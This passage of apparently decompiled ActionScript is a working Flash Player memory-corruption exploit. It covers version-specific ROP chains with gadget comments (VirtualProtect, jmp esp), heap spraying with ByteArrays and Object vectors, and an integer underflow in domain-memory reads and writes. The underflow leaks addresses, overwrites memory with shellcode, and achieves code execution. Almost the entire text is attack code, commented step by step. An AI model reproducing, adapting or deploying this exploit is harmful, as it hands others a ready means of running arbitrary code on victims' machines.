                    vftableAddr_copy = (vftableAddr_copy - 12902952);
                    _local_5 = (vftableAddr_copy + 16904192);
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 1116239));
                    kzkxuuao.position = 64;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 10368763));
                    kzkxuuao.position = 76;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 2586086));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 11752328));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 32732));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 8192266));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 1578904));
                    kzkxuuao.writeUnsignedInt(scAddr);
                    kzkxuuao.writeUnsignedInt(0x1000);
                    kzkxuuao.writeUnsignedInt(64);
                    kzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,7,700,202":
                    vftableAddr_copy = (vftableAddr_copy - 0xc4f508);
                    _local_5 = (vftableAddr_copy + 0x101f000);
                    kzkxuuao.position = 8;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 0x7dfcd2)); // 107dfcd2 : add esp,44h ; ret
                    kzkxuuao.position = 0x40;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 0x12a269)); // 1012a269 : xchg edx,esp ; add  eax,dword ptr [eax]; add  byte ptr [edi+5Eh],bl ; pop ecx ; ret
                    kzkxuuao.position = 0x50;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 0xcb497));  // 100cb497 : pop eax ; ret
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 0xb35388)); // 10b35388 : ptr to VirtualProtect
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 0x110d3d)); // 10110d3d : mov eax,dword ptr [eax] ; ret
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 0x887362)); // 10887362 : push eax ; ret
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 0x331bff)); // 10331bff : jmp esp
                    kzkxuuao.writeUnsignedInt(scAddr);
                    kzkxuuao.writeUnsignedInt(0x1000);
                    kzkxuuao.writeUnsignedInt(0x40);
                    kzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,8,800,97":
                    vftableAddr_copy = (vftableAddr_copy - 129165844);
                    _local_5 = (vftableAddr_copy + 16904192);
                    kzkxuuao.position = 8;
                    kzkxuuao.writeUnsignedInt(vftableAddr_copy);
                    kzkxuuao.position = 16;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 117625919));
                    kzkxuuao.writeUnsignedInt(-1810746282);
                    kzkxuuao.writeUnsignedInt((scAddr + 76));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 122565891));
                    kzkxuuao.position = 44;
                    kzkxuuao.writeUnsignedInt(scAddr);
                    kzkxuuao.writeUnsignedInt(0x1000);
                    kzkxuuao.writeUnsignedInt(64);
                    kzkxuuao.writeUnsignedInt((scAddr - 0x0400));
                    kzkxuuao.position = 64;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 123362382));
                    kzkxuuao.position = 80;
                    kzkxuuao.writeUnsignedInt((scAddr + 192));
                    kzkxuuao.position = 112;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 32365));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 11760520));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 1117213));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 3721232));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 8274178));
                    kzkxuuao.writeUnsignedInt(scAddr);
                    kzkxuuao.writeUnsignedInt(0x1000);
                    kzkxuuao.writeUnsignedInt(64);
                    kzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,8,800,50":
                    vftableAddr_copy = (vftableAddr_copy - 12936000);
                    _local_5 = (vftableAddr_copy + 17149952);
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 404531));
                    kzkxuuao.position = 64;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 2583617));
                    kzkxuuao.position = 72;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 7914140));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 4550));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 11780992));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 32684));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 142358));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 1577816));
                    kzkxuuao.writeUnsignedInt(scAddr);
                    kzkxuuao.writeUnsignedInt(0x1000);
                    kzkxuuao.writeUnsignedInt(64);
                    kzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                default:
                    return (null);
            };
            return (kzkxuuao);
        }
        
        public function exploit():Boolean
        {
            var vector_objects_entry_length:int;
            var shellcode_byte = null;
            var _local_6:uint;
            var i:int;
            var vftable_addr:uint;
            var shellcode_address:uint;
            var vector_objects_entry_idx:uint;
            var length_vector_byte_arrays:uint;
            var vector_byte_arrays:Vector.<ByteArray> = new Vector.<ByteArray>(0);
            var vector_objects:Vector.<Object> = new Vector.<Object>(0);
            var twos_object:Object = new <Object>[2, 2, 2, 2, 2, 2, 2, 2];
            var vickers_byte_array:ByteArray = new ByteArray();
            while (i < 0x0500)
            {
                vector_byte_arrays[i] = new ByteArray();
                vector_byte_arrays[i].length = ApplicationDomain.MIN_DOMAIN_MEMORY_LENGTH;
                i++;
            };
            vickers_byte_array.writeUTFBytes("vickers");
            vickers_byte_array.length = ApplicationDomain.MIN_DOMAIN_MEMORY_LENGTH;
            ApplicationDomain.currentDomain.domainMemory = vickers_byte_array;
            vector_byte_arrays[i] = new ByteArray();
            vector_byte_arrays[i].length = ApplicationDomain.MIN_DOMAIN_MEMORY_LENGTH;
            length_vector_byte_arrays = i;
            i = 0;
            while (i < (vector_byte_arrays.length - 1))
            {
                vector_byte_arrays[i++] = null;
            };
            i = 0;
            while (i < 0x8000)
            {
                vector_objects[i] = new <Object>[i, twos_object, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1];
                i++;
            };
            // _local_6 => nil => 0, makes li32(_local_6 - offset) makes it underflow!
            // Example leak:  0275ef00 => 10c4f508 0000003b 00002326
            if (((!((li16((_local_6 + 1)) == 114))) && (((vftable_addr = li32((_local_6 - 0x0100)) ) == 305419896))))
            {
            };
            if (((!((li16((_local_6 + 1)) == 114))) && (((vector_objects_entry_idx = li32((_local_6 - 248)) ) == 305419896))))
            {
            };
            vector_objects_entry_idx = (vector_objects_entry_idx >> 3);
            if (((!((li16((_local_6 + 1)) == 114))) && (((vector_objects_entry_length = li32((_local_6 - 252)) ) == 305419896))))
            {
            };
            
            // No success
            if (vector_objects_entry_length != vector_objects[vector_objects_entry_idx].length)
            {
                vickers_byte_array = null;
                vector_byte_arrays[length_vector_byte_arrays] = null;
                i = 0;
                while (i < vector_objects.length)
                {
                    vector_objects[i++] = null;
                };
                return (false);
            };
            
            i = 0;
            while (i < vector_objects.length)
            {
                if (i != vector_objects_entry_idx)
                {
                    vector_objects[i] = null;
                };
                i++;
            };
            // Use underflow to leak shellcode address
            if (((!((li16((_local_6 + 1)) == 114))) && (((shellcode_address = li32((_local_6 - 0x0200)) ) == 305419896))))
            {
            };
            shellcode_address = (shellcode_address + 0x1300);
            var paeikkzkxuuao:ByteArray = makejaiua(vftable_addr, shellcode_address);
            if (paeikkzkxuuao == null)
            {
                return (true);
            };
            var j:uint;
            var shellcode_length:uint = shellcode.length;
            var shellcode_byte_array:ByteArray = new ByteArray();
            shellcode_byte_array.endian = "littleEndian";
            while (j < shellcode_length)
            {
                shellcode_byte = (shellcode.charAt(j) + shellcode.charAt((j + 1)));
                shellcode_byte_array.writeByte(parseInt(shellcode_byte, 16));
                j = (j + 2);
            };
            vector_byte_arrays[length_vector_byte_arrays].position = 0;
            vector_byte_arrays[length_vector_byte_arrays].endian = "littleEndian";
            vector_byte_arrays[length_vector_byte_arrays].writeBytes(paeikkzkxuuao);
            vector_byte_arrays[length_vector_byte_arrays].writeBytes(shellcode_byte_array);
            // Use underflow to overwrite and get code execution
            if (li16((_local_6 + 1)) != 114)
            {
                si32((shellcode_address + 1), (_local_6 - 244));
            };
            vector_objects[vector_objects_entry_idx][1][0];
            return (true);
        }
        
        
    }
}//package
